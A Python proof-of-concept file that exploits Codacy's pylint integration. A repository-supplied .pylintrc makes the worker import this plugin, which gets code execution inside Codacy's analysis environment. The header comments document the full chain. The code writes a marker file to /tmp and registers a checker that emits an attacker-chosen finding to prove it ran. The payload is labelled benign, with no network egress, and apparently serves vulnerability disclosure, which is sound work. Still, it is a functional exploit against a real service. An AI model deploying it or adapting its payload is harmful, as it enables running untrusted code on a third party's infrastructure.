# PoC payload (v3) - BENIGN MARKER ONLY. RCE via codacy-pylint on the no-patterns branch.
#
# Chain: .codacyrc lists pylint with patterns:[]  ->  codacy-pylint wrapper passes NO --rcfile
# (rcfile=None, see codacy_pylint.py runPylintWith on the else/no-patterns branch) -> pylint 1.9.5
# calls find_pylintrc() (cwd=/src) and discovers /src/.pylintrc -> its load-plugins=codacy_rce_probe
# triggers PyLinter.load_plugin_modules -> modutils.load_module_from_name("codacy_rce_probe") ->
# this module is imported (top-level code runs = code execution) -> register(linter) registers the
# checker -> visit_module emits a finding whose attacker-chosen symbol/patternId surfaces in the
# Codacy /issues/search API, proving the plugin loaded and ran. No network egress, no destructive
# action.
import os
import sys

# (1) Marker write - proves top-level code ran in the worker (container-local; not API-visible but
# documented for completeness). Wrapped so a write failure never aborts the import/Register.
_marker = "/tmp/codacy-pylint-rce-confirmed.txt"
try:
    with open(_marker, "w") as _f:
        _f.write("RCE confirmed via pylint load-plugins import. cwd=%s marker=%s\n" % (os.getcwd(), _marker))
except Exception:
    pass

# (2) Register a real pylint checker so execution is observable through the Codacy results API.
from pylint.checkers import BaseChecker
from pylint.interfaces import IAstroidChecker

_SENTINEL_SYM = "codacy-rce-pylint-proof-%s" % os.getpid()

class CodacyRceProbeChecker(BaseChecker):
    """Minimal checker: emits one finding with an attacker-chosen symbol/patternId."""
    __implements__ = (IAstroidChecker,)

    name = "codacy_rce_probe"
    msgs = {
        "E9999": (
            "CODEX_RCE_PYLINT_PROOF_%s_marker_written_%s emitted by load-plugins module exec" % (os.getcwd(), _marker),
            "codacy-rce-pylint-proof",
            "Provably emitted by a repo-supplied pylint plugin (load-plugins import) inside the Codacy worker.",
        ),
    }

    def visit_module(self, node):
        self.add_message("E9999", line=1, node=node)


def register(linter):
    """required auto-register entry point invoked by PyLinter.load_plugin_modules."""
    linter.register_checker(CodacyRceProbeChecker(linter))
